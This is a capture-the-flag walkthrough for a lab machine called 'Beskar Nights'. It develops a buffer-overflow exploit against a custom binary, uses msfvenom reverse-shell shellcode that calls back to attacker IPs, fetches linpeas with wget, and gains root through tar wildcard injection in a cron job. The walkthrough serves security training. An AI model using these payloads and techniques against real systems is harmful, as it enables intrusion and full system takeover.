## Beskar Nights - Official Walkthrough

### **Introduction**
Beskar Nights is a vulnerable Linux machine with an interesting twist. This machine will test your 
exploit development knowledge and keep you on your toes from start to finish. The foothold comes 
through the exploitation of a custom binary that is running on the production system. Once a low-level shell has been established, some quick enumeration of the system leads to privilege 
escalation; resulting in a root shell! With the introduction out of the way, let's jump right in!

### **Scanning & Enumeration** 
A crucial part of penetration testing is the Information Gathering phase. In this part of the process 
the tester collects information on the target through active and passive reconnaissance. In this 
case, we will be actively collecting information on the target in the form of a port scan. We will use 
Nmap to collect open TCP ports, Service Versions, and run scripts against the services detected. To 
start things off, we will scan the target IP address using the following command:
```console
sudo nmap -sC -sV -T4 -p- -oN nmap/beskarNights.nmap 10.10.130.11
```
<p align="center">
<a href="/images/nmap_1.png"><img src="/images/nmap_1.png"></a>
 </p>

There is a lot of valuable information that can be collected from the output of this Nmap scan. First, 
we can see that the system has TCP ports 80, 2222, and 31337 open and accessible by the public. 

We can also see that the system is potentially running Ubuntu Linux based on the output of the SSH service version information. Nmap has a hard time identifying the service that is running on port 31337. Since this is interesting, that is where we will start.

In order to investigate the interesting service further, we will use Netcat to make a connection and interact with it. To perform this investigation, we will use the following command:
```console
nc -nv 10.10.130.11 31337
```
<p align="center">
<a href="/images/nc_1.png"><img src="/images/nc_1.png"></a>
 </p>

As you can see in the screenshot above, if we enter HELP, the service simply echoes back the user input. Although this is interesting, not knowing what the service is makes it difficult to find vulnerabilities to exploit. In this case, we will move onto the HTTP service running on port 80.

To get an idea what is running on the HTTP service, we will browse to **http://10.10.130.11/**. Before the page is loaded, a HTTP Basic Authentication window is displayed. The message in the login window says “Restricted Content”.

<p align="center">
<a href="/images/basic.png"><img src="/images/basic.png"></a>
 </p>

This is an interesting finding. It is a good possibility that this site is still under development and the creator implemented an authentication mechanism to keep the contents private. We’ll try some simple username/password combinations to test the password practices of the target. The first and most popular combination we will use is **admin:admin**. 

<p align="center">
<a href="/images/auth.png"><img src="/images/auth.png"></a>
 </p>

It appears that the target is not using strong password practices because the credentials work and we are authenticated to the page!

<p align="center">
<a href="/images/index.png"><img src="/images/index.png"></a>
</p>
 
One of the first things we will check is for the presence of a robots.txt file. This is accomplished by browsing to **http://10.10.130.11/robots.txt**. 

<p align="center">
<a href="/images/robots.png"><img src="/images/robots.png"></a>
</p>
 
There is one entry in the Disallow section: **/dev**. This is an interesting finding so that is where we will look next.

Browsing to **http://10.10.130.11/dev/** brings up a directory listing that contains an interesting executable file. It is obvious at this point that the site is still under development and there aren’t many security-focused practices being implemented. This binary seems to be interesting so we will download it to our local system.
<p align="center">
<a href="/images/beskarexe.png"><img src="/images/beskarexe.png"></a>
 </p>

To download the file, we will simply click on the executable and a prompt window will appear asking us what we want to do with the file. In this case, we will select the save option in order to download it to the local system.

<p align="center">
<a href="/images/download.png"><img src="/images/download.png"></a>
 </p>

Now that we have a copy on our local system, we can inspect its behavior in more detail by transferring it to a Windows system.

### **Exploit Development**
The first thing we will do is run the program to check the behavior. Normally, running a random executable file found online would be a bad practice. Since this is being run in a virtual environment that is contained to a local network, it is safe to do. The reason it is a bad practice is you could potentially introduce malware into your system or network if you are not careful. Use common sense when dealing with executables found online!

#### **Fuzzing**
Once we have the executable transferred to our Windows system, we will run it to check out what it does.

<p align="center">
<a href="/images/run_1.png"><img src="/images/run_1.png"></a>
 </p>

The program spawns a window and appears to be listening for incoming connections. Without decompiling the executable to see what port it is listening on; we can assume that it is listening on TCP port 31337. This is a valid assumption because of the weird service Nmap failed to identify earlier in the process. This can be checked by attempting to make a connection to the program on port 31337 from our Kali instance. We will use the following command to make the connection:
```console
nc -nv 192.168.110.129 31337
```
<p align="center">
<a href="/images/nc_2.png"><img src="/images/nc_2.png"></a>
 </p>

There are a few things to be noticed in the screenshot above. The first thing to notice is that the target IP address has changed. This is because we are using a local Windows system for testing the binaries functionality. The next thing to notice is that we get the exact output we received when interacting with the interesting service on the target. Now that we have control of the binary, and can make connections to it, we will develop a script to fuzz the input and test for a Buffer Overflow condition.

The script we will use to perform fuzzing can be seen in the screenshot below. It makes a TCP connection to the target IP address and port, sends “HELP” followed up with 100 “A’s”. This process will continue until a Socket Error is received. Each time it loops through, it will add 100 more “A’s” to the payload and send it to the target. If a Buffer Overflow condition is present, the buffer space will continue to fill until it is overrun with characters causing the program to crash. 

<p align="center">
<a href="/images/fuzz_py.png"><img src="/images/fuzz_py.png"></a>
 </p>

We will run the script against the target our local Windows system using the following command:
```console
python fuzz.py
```
<p align="center">
<a href="/images/fuzzing.png"><img src="/images/fuzzing.png"></a>
 </p>

After running the script, we get the program to crash at 300 bytes! This gives us a good indication that a Buffer Overflow condition could be present within the binary. We can inspect the traffic captured by Wireshark to see how out script interreacted with the binary. This will help guide us in the upcoming steps of the exploit development process.

<p align="center">
<a href="/images/wireshark.png"><img src="/images/wireshark.png"></a>
 </p>

There is a lot of valuable information that can be collected from the Wireshark capture shown in the screenshot above. We will focus on the packet sent that caused the program crash. Looking at the Packet Details pane (middle) we can see that 206 bytes were sent in this packet. This is interesting because our script rounded that number of to 300. This is because it is sending multiples of 100 at a time. This information is important because we know as long as we send more than 206 bytes, the program will crash. It also informs us that the EIP Offset will be at less than 206 bytes. The capture also shows in the Bytes Pane (bottom) the payload that was sent by the script. Now that we have this information, we can move onto finding the exact offset of the EIP.

#### **Finding the Offset**
For this part of the process, we will open and run the executable in Immunity Debugger on the Windows system. This is done by selecting **File --> Open --> beskarNights.exe --> Open**.

<p align="center">
<a href="/images/imdb_1.png"><img src="/images/imdb_1.png"></a>
 </p>

Once the program has been attached to Immunity Debugger, we can start the program execution two ways: the first is by selecting the Play icon in the top pane, or we can simply hit **F9** to start the program. This process will be used to attach and run the program for the rest of the process.

<p align="center">
<a href="/images/imdb_2.png"><img src="/images/imdb_2.png"></a>
 </p>

Now that the program is attached and running in Immunity Debugger, we can develop our offset finder script. We will use our fuzzing script as a base and make some changes to it to find the EIP Offset. Before we can get to that, we will generate a random patter using Metasploit Framework’s **pattern_create.rb** script. This will generate a random patter that we can use to calculate the exact offset of the EIP. To accomplish this task, we will use the following command:
```console
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 300
```
<p align="center">
<a href="/images/pattern_create.png"><img src="/images/pattern_create.png"></a>
 </p>

Shown in the screenshot below is the script we will use to perform the offset finding portion of the test. It makes a connection to the target IP and port, sends the pattern with a return and newline character added, and closes the connection. 

<p align="center">
<a href="/images/finder_py.png"><img src="/images/finder_py.png"></a>
 </p>

We will run this against the binary running on the Windows system using the following command:
```console
python finder.py
```
<p align="center">
<a href="/images/finder.png"><img src="/images/finder.png"></a>
 </p>

As we expected, the program crashes and Immunity Debugger catches the crash; pausing the program execution.

<p align="center">
<a href="/images/imdb_3.png"><img src="/images/imdb_3.png"></a>
 </p>

We can take a closer look at the value located within the EIP on the Registers pane. In this case, the value is 65413765. We will copy this value to our clipboard to calculate the EIP Offset.

<p align="center">
<a href="/images/imdb_eip.png"><img src="/images/imdb_eip.png"></a>
 </p>

We can now use Metasploit Framework’s pattern_offset.rb to calculate the exact offset location of the EIP. This can be done using the following command:
```console
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 300 -q 65413765
```
<p align="center">
<a href="/images/pattern_offset.png"><img src="/images/pattern_offset.png"></a>
 </p>

Shown in the screenshot above is the exact EIP Offset location returned by pattern_create.rb. We will now verify that the offset we discovered is correct. This will ensure that we can control program execution by gaining control of the EIP.

#### **Offset Verification**
Since the program crashed in the last step in the testing process, we will re-open and attach it to Immunity Debugger. We will use the same steps previously listed.

<p align="center">
<a href="/images/imdb_1.png"><img src="/images/imdb_1.png"></a>
 </p>
<p align="center">
<a href="/images/imdb_2.png"><img src="/images/imdb_2.png"></a>
 </p>

Now that the program is attached and running in Immunity Debugger, we can develop a script to verify the offset value that we previously discovered. Shown in the screenshot below is the script we will use to verify the EIP Offset value. This script will connect to the target IP and port, send 142 “A’s” followed by 4 “B’s” and a return and newline character, then it closes the connection. This will effectively cause the program to crash and overwrite the EIP with **42424242**.

<p align="center">
<a href="/images/verify_py.png"><img src="/images/verify_py.png"></a>
 </p>

We will execute our EIP Offset verification script using the following command:
```console
python verify.py
```
<p align="center">
<a href="/images/verify.png"><img src="/images/verify.png"></a>
 </p>

As expected, the program crashes and Immunity pauses the program execution for further inspection. 

<p align="center">
<a href="/images/imdb_4.png"><img src="/images/imdb_4.png"></a>
 </p>

If we take a closer look at the values located within the EIP, we will see **42424242 (4 “B’s”)**. This means that we now control the EIP. This is important to achieve in the exploit development process because now we can control the programs execution. Ultimately, this will allow us to remotely execute commands on the system. Before we can get to that point, we need to fish out the characters that the program rejects.

<p align="center">
<a href="/images/imdb_eip_2.png"><img src="/images/imdb_eip_2.png"></a>
 </p>

#### **Finding Bad Characters**
This step in the process will allow us to find the characters that the binary rejects (bad characters). We will accomplish by using a script that sends all **255 ASCII characters** in hexadecimal representation to the program at once. It will be fairly obvious to see what characters the program accepts and the ones that it does now. Before we get to that point we will open and attach the binary to Immunity Debugger using the steps previously outlined.

<p align="center">
<a href="/images/imdb_1.png"><img src="/images/imdb_1.png"></a>
 </p>
<p align="center">
<a href="/images/imdb_2.png"><img src="/images/imdb_2.png"></a>
 </p>

Now that the program is attached and running, let’s take a look at our bad character hunting script. Shown below is the script that we will use for this part of the process.

<p align="center">
<a href="/images/bad_py.png"><img src="/images/bad_py.png"></a>
 </p>

This script will connect to the target IP and port, send 142 “A’s” followed with 4 “B’s” followed up by all 255 ASCII characters with a return and newline added. In order to execute the script, we will use the following command:
```console
python bad_char_.py
```
<p align="center">
<a href="/images/bad_char.png"><img src="/images/bad_char.png"></a>
 </p>

As we expected, the program crashed and Immunity caught the exception.

<p align="center">
<a href="/images/imdb_5.png"><img src="/images/imdb_5.png"></a>
 </p>

In order to search for bad characters, we will need to **Right-Click ESP --> Follow in Dump**. This will bring up the hex dump shown in the screenshot below.

<p align="center">
<a href="/images/hex_dump.png"><img src="/images/hex_dump.png"></a>
 </p>

In terms of exploit development, it can be assumed that **\x00** is always going to be a bad character because it maps to nothing or NULL. We can see in the screenshot above that there is one lone bad character (outside **\x00**) and that is **\x0a**. The characters that this program rejects are **\x00\x0a**. We will use these values as our bad characters moving forward with the process. The next step is to find the return address.

#### **Finding the Return Address**
Before we can get into shell code generation and creating an exploitation proof of concept, we need to find the return address for **JMP ESP**. This will allow us to execute our shellcode in the exact location necessary to gain Remote Code Execution on the target system. We will accomplish this task using **mona.py** integrated into our Immunity Debugger install. In order to begin this process, we first need to open and attach the program in Immunity using the steps previously listed.

<p align="center">
<a href="/images/imdb_1.png"><img src="/images/imdb_1.png"></a>
 </p>
<p align="center">
<a href="/images/imdb_2.png"><img src="/images/imdb_2.png"></a>
 </p>

Now that the program is loaded and running, we will search for the return address for JMP ESP that does not contain any of the bad characters that we found in the last step. We will do this by executing the following command within Immunity Debugger:
```console
!mona jmp -r esp -cpb "\x00\x0a"
```
<a href="/images/mona_jmp.png"><img src="/images/mona_jmp.png"></a>

There is some valuable information that we can collect from the screenshot above. Most importantly, the return address (displayed backwards) for **JMP ESP** is **\xc3\x14\x04\x08**. The next important bit of information we can collect is that **ASLR is not present**. Now, we can generate some shell code and create a proof of concept!

#### **Local Exploitation**
To start things off, we will open and attach the program to Immunity Debugger using the steps previously listed.

<p align="center">
<a href="/images/imdb_1.png"><img src="/images/imdb_1.png"></a>
 </p>
<p align="center">
<a href="/images/imdb_2.png"><img src="/images/imdb_2.png"></a>
 </p>

We will now use MSFVenom to generate custom shell code to plug into our proof of concept. The command we will use is as follows:
```console
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.110.130 LPORT=2222 EXITFUNC=thread -f c -a x86 -b "\x00\x0a"
 ```
 <p align="center">
 <a href="/images/msfvenom_local.png"><img src="/images/msfvenom_local.png"></a>
 </p>

We will use this shell code to achieve a reverse TCP connection (reverse shell) from the remote host. The script we will use to accomplish this can be seen in the screenshot below.

<p align="center">
 <a href="/images/local_exploit_py.png"><img src="/images/local_exploit_py.png"></a>
 </p>

Now that we have our proof-of-concept script all configured, it's time to pop a shell! We will first set up a Netcat listener using the following command:
```console
nc -nlvp 2222
```
We will then use the following command to execute the exploitation script:
```console
python exploit.py
```
<p align="center">
 <a href="/images/local_exploit.png"><img src="/images/local_exploit.png"></a>
 </p>

As we expected, we received a reverse TCP connection from our local Windows system! This will allow us to remotely execute commands on the target.

<p align="center">
 <a href="/images/local_shell.png"><img src="/images/local_shell.png"></a>
 </p>

To provide some further proof of concept, we will execute the following commands on our local Windows system through our reverse TCP connection:
```console
whoami
```
```console
ipconfig
```
<p align="center">
 <a href="/images/local_proof.png"><img src="/images/local_proof.png"></a>
 </p>

Now that we have proven that our proof-of-concept script works, we can make some changes that will allow us to establish a foothold on the target system.

### **Exploitation**
There are a few things that we need to do before we can pop a shell on the target system. The first thing that is important to remember is that we are targeting a Linux system. Referring back to our Nmap scan, we can see that the service version for SSH belongs to Ubuntu Linux. Now, how is it possible for a Linux system to execute a Windows executable? Well, let’s find out!

<p align="center">
 <a href="/images/nmap_2.png"><img src="/images/nmap_2.png"></a>
 </p>

To get things started, we first need to generate shellcode using the appropriate payload for the type of system we are targeting. In this case, we will need to use a payload that targets 32-bit Linux systems. The command we will use to generate the shell code is as follows:
```console
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.6.95.238 LPORT=2222 EXITFUNC=thread -f c -a x86 -b "\x00\x0a"
```
<p align="center">
 <a href="/images/msfvenom_remote.png"><img src="/images/msfvenom_remote.png"></a>
 </p>

We will simply replace our shellcode in our exploitation script as well as change the target IP address. The changes that were made to the script can be seen in the screenshot below.

<p align="center">
 <a href="/images/remote_exploit_py.png"><img src="/images/remote_exploit_py.png"></a>
 </p>

Now that the script has been modified, we can send our payload to the target system using the following command:

<p align="center">
 <a href="/images/remote_exploit.png"><img src="/images/remote_exploit.png"></a>
 </p>

As expected, we received a reverse TCP connection from the target host!

<p align="center">
 <a href="/images/remote_shell.png"><img src="/images/remote_shell.png"></a>
 </p>

### **Post-Exploitation**
The first thing we will do to our newly established shell is make it a fully interactive TTY session. This will give us the look and feel of a normal terminal session. We will accomplish this by entering the series of following commands:
```console
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
```console
export TERM=xterm
```
```console
^Z (CTRL-Z)
```
```console
stty raw -echo; fg (ENTER x2)
```
<p align="center">
 <a href="/images/shell_upgrade.png"><img src="/images/shell_upgrade.png"></a>
 </p>

#### **user.txt**
Now that we have a low-level shell, we can grab the **user.txt** flag. For this challenge, the shell lands in the user’s home directory. We will execute the following command to get the flag:
```console
cat user.txt
```
<p align="center">
 <a href="/images/user_txt.png"><img src="/images/user_txt.png"></a>
 </p>

### **Privilege Escalation**
The main goal of this challenge is to achieve a root shell and access the **root.txt** flag. To do this, we need to perform privilege escalation to escalate from our current low-level shell to root. We will use **linpeas.sh** to help speed up the process of discovering the privilege escalation vector. First, we need to upload **linpeas.sh** to the target system, make it executable, and then run it. We will accomplish this task using the following commands:
```console
wget http://10.6.95.238/linpeas.sh
```
```console
chmod +x linpeas.sh
```
```console
./linpeas.sh
```
<p align="center">
 <a href="/images/upload_linpeas.png"><img src="/images/upload_linpeas.png"></a>
 </p>

There are some interesting cron jobs that are being run on this system. The first cron job uses Wine to execute **beskarNights.exe** every two minutes. This would explain why there is a Windows binary running on a Linux system! The next cron job is named **5minutes**; this stands out as abnormal. We will investigate this further.

<p align="center">
 <a href="/images/cron_job.png"><img src="/images/cron_job.png"></a>
 </p>

We are especially interested in the **5minutes** cron job because it is being run by root. Let’s take a closer look at what it does by running the following command:
```console
cat /etc/cron.d/5minutes
```
<p align="center">
 <a href="/images/cron_contents.png"><img src="/images/cron_contents.png"></a>
 </p>

As we can see in the screenshot above, the cron job changes into the **/var/www/html** directory and uses tar to compress all of its contents and send them to **/tmp/beskarNights.tar.gz**. Notice how this cron job uses a wildcard character to grab all of the contents within the **/var/www/html** directory. Let’s see how we can abuse this to achieve a root shell. First, we need to do a little research to figure out how to leverage this misconfiguration to achieve privilege escalation. There is a good proof of concept on [Hacking Articles](https://www.hackingarticles.in/linux-privilege-escalation-by-exploiting-cron-jobs/) for this exact scenario.

<p align="center">
 <a href="/images/hacking_articles.png"><img src="/images/hacking_articles.png"></a>
 </p>

As we can see in the screenshot above, we can create a script in the directory that the cron job is being executed on and add a couple extra commands that will cause the script to be executed when the job is run. For our case, we will make some minor changes to this process. We will first generate a Python3 reverse shell using [Reverse Shell Generator](https://www.revshells.com/).

<p align="center">
 <a href="/images/rev_shell_gen.png"><img src="/images/rev_shell_gen.png"></a>
 </p>

After the reverse shell is generated, we will create a file called **test.sh** in the **/var/www/html** directory using the following command:
```console
vim test.sh
```
<p align="center">
 <a href="/images/rev_shell.png"><img src="/images/rev_shell.png"></a>
 </p>

After creating test.sh, we will execute the following commands to ensure that our reverse shell script is executed when the job is run:
```console
echo "" > "--checkpoint-action=exec=sh test.sh"
```
```console
echo "" > --checkpoint=1
```
```console
chmod 777 test.sh
```
<p align="center">
 <a href="/images/wildcard_injection.png"><img src="/images/wildcard_injection.png"></a>
 </p>

As we can see in the screenshot above, everything we need to perform the privilege escalation is in place. Now, all we need is for the cron job to run. Referring back to the cron job output, the job is scheduled to run every 5 minutes. After a short wait, we receive a root shell!

<p align="center">
 <a href="/images/root_shell.png"><img src="/images/root_shell.png"></a>
 </p>

#### **root.txt**
The final goal of many CTF challenges is to achieve a root shell and grab the root.txt flag. We will accomplish this by entering the following commands:
```console
whoami
```
```console
cat /root/root.txt
```
```console
ifconfig
```
<p align="center">
 <a href="/images/proof_txt.png"><img src="/images/proof_txt.png"></a>
 </p>
